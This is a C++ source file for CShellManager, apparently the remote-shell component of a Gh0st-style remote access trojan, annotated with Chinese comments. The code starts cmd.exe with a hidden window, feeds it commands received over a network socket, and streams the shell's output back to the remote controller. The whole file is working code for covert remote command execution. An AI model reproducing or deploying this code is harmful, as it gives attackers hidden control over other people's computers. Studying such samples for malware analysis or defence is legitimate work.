// ShellManager.cpp: implementation of the CShellManager class.
//
//////////////////////////////////////////////////////////////////////

#include "ShellManager.h"

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CShellManager::CShellManager(CClientSocket *pClient):CManager(pClient)
{
    SECURITY_ATTRIBUTES  sa = {0};  
	STARTUPINFO          si = {0};
	PROCESS_INFORMATION  pi = {0}; 
	char  strShellPath[MAX_PATH] = {0};

    m_hReadPipeHandle	= NULL;
    m_hWritePipeHandle	= NULL;
	m_hReadPipeShell	= NULL;
    m_hWritePipeShell	= NULL;
    sa.nLength = sizeof(sa);
    sa.lpSecurityDescriptor = NULL; 
    sa.bInheritHandle = TRUE;

/*	
BOOL WINAPI CreatePipe(
  _Out_    PHANDLE               hReadPipe,
  _Out_    PHANDLE               hWritePipe,
  _In_opt_ LPSECURITY_ATTRIBUTES lpPipeAttributes,
  _In_     DWORD                 nSize
);
*/
    // Create 2 pipes.
    if(!CreatePipe(&m_hReadPipeHandle, &m_hWritePipeShell, &sa, 0)) // cmd 結果 -> server app 
	{
		if(m_hReadPipeHandle != NULL)	CloseHandle(m_hReadPipeHandle);
		if(m_hWritePipeShell != NULL)	CloseHandle(m_hWritePipeShell);
		return;
    }

    if(!CreatePipe(&m_hReadPipeShell, &m_hWritePipeHandle, &sa, 0)) // (client command ->)server command -> cmd
	{
		if(m_hWritePipeHandle != NULL)	CloseHandle(m_hWritePipeHandle);
		if(m_hReadPipeShell != NULL)	CloseHandle(m_hReadPipeShell);
		return;
    }

	memset((void *)&si, 0, sizeof(si));
    memset((void *)&pi, 0, sizeof(pi));


	GetStartupInfo(&si);// 獲得該prcoess屬性給即將create的cmd process
	si.cb = sizeof(STARTUPINFO);
    si.wShowWindow = SW_HIDE; // 隱藏視窗
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdInput  = m_hReadPipeShell;
    si.hStdOutput = si.hStdError = m_hWritePipeShell; 

	GetSystemDirectory(strShellPath, MAX_PATH);
	strcat(strShellPath,"\\cmd.exe");

	// Create cmd process
	if (!CreateProcess(strShellPath, NULL, NULL, NULL, TRUE, 
		NORMAL_PRIORITY_CLASS, NULL, NULL, &si, &pi)) 
	{
		CloseHandle(m_hReadPipeHandle);
		CloseHandle(m_hWritePipeHandle);
		CloseHandle(m_hReadPipeShell);
		CloseHandle(m_hWritePipeShell);
		return;
    }
	m_hProcessHandle = pi.hProcess;
	m_hThreadHandle	= pi.hThread;

	BYTE	bToken = TOKEN_SHELL_START;
	// 告訴 client 準備完成
	Send((LPBYTE)&bToken, 1);
	WaitForDialogOpen();
	// 開 2 個 threads
	// 讀 pipe 內容
	m_hThreadRead = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ReadPipeThread, (LPVOID)this, 0, NULL);
	// 等 pipe 關閉
	m_hThreadMonitor = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MonitorThread, (LPVOID)this, 0, NULL);
}

CShellManager::~CShellManager()
{
	TerminateThread(m_hThreadRead, 0);
	TerminateProcess(m_hProcessHandle, 0);
	TerminateThread(m_hThreadHandle, 0);
	WaitForSingleObject(m_hThreadMonitor, 2000);
	TerminateThread(m_hThreadMonitor, 0);

	if (m_hReadPipeHandle != NULL)
		DisconnectNamedPipe(m_hReadPipeHandle);
	if (m_hWritePipeHandle != NULL)
		DisconnectNamedPipe(m_hWritePipeHandle);
	if (m_hReadPipeShell != NULL)
		DisconnectNamedPipe(m_hReadPipeShell);
	if (m_hWritePipeShell != NULL)
		DisconnectNamedPipe(m_hWritePipeShell);

    CloseHandle(m_hReadPipeHandle);
    CloseHandle(m_hWritePipeHandle);
    CloseHandle(m_hReadPipeShell);
    CloseHandle(m_hWritePipeShell);

    CloseHandle(m_hProcessHandle);
	CloseHandle(m_hThreadHandle);
	CloseHandle(m_hThreadMonitor);
    CloseHandle(m_hThreadRead);
}

// Implementation of OnReceive
// 讓 server 端可以收 client 端訊息並傳到 pipe 裡給 cmd
void CShellManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	if (nSize == 1 && lpBuffer[0] == COMMAND_NEXT)
	{
		NotifyDialogIsOpen();
		return;
	}
	
	unsigned long	ByteWrite;
	// 將從server收到的訊息傳給pipe
	WriteFile(m_hWritePipeHandle, lpBuffer, nSize, &ByteWrite, NULL);
}
// 讀 pipe 內容 並傳回 client 的 thread
DWORD WINAPI CShellManager::ReadPipeThread(LPVOID lparam)
{
	unsigned long   BytesRead = 0;
	char	ReadBuff[1024];
	DWORD	TotalBytesAvail;
	CShellManager *pThis = (CShellManager *)lparam;
	while (1)
	{
		Sleep(100);
		// Peek 一下，Pipe 有東西則 True
		// 沒東西就會一直sleep直到有東西再進這個whie loop
		while (PeekNamedPipe(pThis->m_hReadPipeHandle, ReadBuff, sizeof(ReadBuff), &BytesRead, &TotalBytesAvail, NULL)) 
		{
			if (BytesRead <= 0)
				break; //cmd.exe已經關掉
			memset(ReadBuff, 0, sizeof(ReadBuff));
			LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, TotalBytesAvail);

			// 讀取 Pipe 內訊息
			ReadFile(pThis->m_hReadPipeHandle, lpBuffer, TotalBytesAvail, &BytesRead, NULL);
			// 再傳到 主控端 那裡 
			pThis->Send(lpBuffer, BytesRead);
			LocalFree(lpBuffer);
		}
	}
	return 0;
}

DWORD WINAPI CShellManager::MonitorThread(LPVOID lparam)
{
	CShellManager *pThis = (CShellManager *)lparam;
	HANDLE hThread[2];
	hThread[0] = pThis->m_hProcessHandle;
	hThread[1] = pThis->m_hThreadRead;
	WaitForMultipleObjects(2, hThread, FALSE, INFINITE);
	TerminateThread(pThis->m_hThreadRead, 0);
	TerminateProcess(pThis->m_hProcessHandle, 1);
	pThis->m_pClient->Disconnect();
	return 0;
}
